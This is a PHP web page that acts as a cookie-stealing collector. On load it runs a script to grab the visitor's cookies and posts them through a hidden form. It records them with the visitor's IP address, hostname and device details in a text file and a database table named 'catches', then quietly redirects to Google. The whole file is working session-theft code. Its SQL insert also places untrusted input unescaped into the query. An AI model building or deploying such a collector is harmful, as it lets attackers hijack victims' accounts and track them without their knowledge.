<?php
	if(!empty($_SERVER["HTTP_CLIENT_IP"])){
		$ip_address = $_SERVER["HTTP_CLIENT_IP"];
	} else if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
		$ip_address = $_SERVER["HTTP_X_FORWARDED_FOR"];
	} else {
		$ip_address = $_SERVER["REMOTE_ADDR"];
	}

	$user_agent = $_SERVER["HTTP_USER_AGENT"];
	$hostname = getHostByName(getHostName());
	
	function getOS(){
		global $user_agent;
		$os_platform = "Unknown OS Platform";
		$os_array = array(
			'/windows nt 10/i'      =>  'Windows 10',
			'/windows nt 6.3/i'     =>  'Windows 8.1',
			'/windows nt 6.2/i'     =>  'Windows 8',
			'/windows nt 6.1/i'     =>  'Windows 7',
			'/windows nt 6.0/i'     =>  'Windows Vista',
			'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
			'/windows nt 5.1/i'     =>  'Windows XP',
			'/windows xp/i'         =>  'Windows XP',
			'/windows nt 5.0/i'     =>  'Windows 2000',
			'/windows me/i'         =>  'Windows ME',
			'/win98/i'              =>  'Windows 98',
			'/win95/i'              =>  'Windows 95',
			'/win16/i'              =>  'Windows 3.11',
			'/macintosh|mac os x/i' =>  'Mac OS X',
			'/mac_powerpc/i'        =>  'Mac OS 9',
			'/linux/i'              =>  'Linux',
			'/ubuntu/i'             =>  'Ubuntu',
			'/iphone/i'             =>  'iPhone',
			'/ipod/i'               =>  'iPod',
			'/ipad/i'               =>  'iPad',
			'/android/i'            =>  'Android',
			'/blackberry/i'         =>  'BlackBerry',
			'/webos/i'              =>  'Mobile');

		foreach ($os_array as $regex => $value) {
			if (preg_match($regex, $user_agent)) {
				$os_platform = $value;
				return $os_platform;
                        } else {
                                $os_platform = "Unknown Platform";
                                return $os_platform;
                        }
                }
	}

	function getBrowser() {
		global $user_agent;
		$browser = "Unknown Browser";
		$browser_array = array(
			'/msie/i'      => 'Internet Explorer',
			'/firefox/i'   => 'Firefox',
			'/safari/i'    => 'Safari',
			'/chrome/i'    => 'Chrome',
			'/edge/i'      => 'Edge',
			'/opera/i'     => 'Opera',
			'/netscape/i'  => 'Netscape',
			'/maxthon/i'   => 'Maxthon',
			'/konqueror/i' => 'Konqueror',
			'/mobile/i'    => 'Handheld Browser');
			
		foreach ($browser_array as $regex => $value) {
			if (preg_match($regex, $user_agent)) {
				$browser = $value;
				return $browser;
                        } else {
                                $browser = "Unknown Browser";
                                return $browser;
                        }
                }
	}

	$user_os = getOS();
	$user_browser = getBrowser();
	$device_details = "$user_browser, $user_os";
	$date = date("Y-m-d H:i:s");
?>
<!DOCTYPE html>
<head>
	<title></title>
	<script src="js/getCookie.js"></script>
</head>
<body onload="getCookie();">
	<?php
		require("db/db.php");

		if(isset($_POST['cookieval'])){
			$cookie = $_POST["cookieval"];
			$dc = $_POST["decodedcookie"];

			$file = fopen('catch.txt', 'a');
			fwrite($file,
			       "Cookie: ".$cookie
			       ."\nDecoded Cookie: ".$dc
			       ."\nExternal IP Address: ".$ip_address
			       ."\nLocal IP/Webhost: ".$hostname
			       ."\nDevice Details: ".$device_details
			       ."\nCatch Date: ".$date
			       ."\n\n"
			);

			$db->exec("INSERT INTO catches(cookie, decoded_cookie, ip_address, hostname, device_details, catch_date) VALUES ('$cookie', '$dc', '$ip_address', '$hostname', '$device_details', '$date')");

			echo "<script>window.location.replace('https://www.google.com/');</script>";
		} else {
			$cookie = "Failed to collect cookie";
			$dc = "Nothing to decode";

			$file = fopen("catch.txt", "a");
			fwrite($file,
			       "Cookie: ".$cookie
			       ."\nDecoded Cookie: ".$dc
			       ."\nExternal IP Address: ".$ip_address
			       ."\nLocal IP/Webhost: ".$hostname
			       ."\nDevice Details: ".$device_details
			       ."\nCatch Date: ".$date
			       ."\n\n"
			);

			$db->exec("INSERT INTO catches(cookie, decoded_cookie, ip_address, hostname, device_details, catch_date) VALUES ('$cookie', '$dc', '$ip_address', '$hostname', '$device_details', '$date')");

			echo "<script>window.location.replace('https://www.google.com/');</script>";
		}
	?>

	<form id="catchForm"  method="POST" action="" >
		<input type="text" name="cookieval" id="cookieval" hidden />
		<input type="text" name="decodedcookie" id="decodedcookie" hidden />
	</form>
	<button form="catchForm" name="submitForm" id="submitForm" style="display:none;"></button>
</body>
</html>
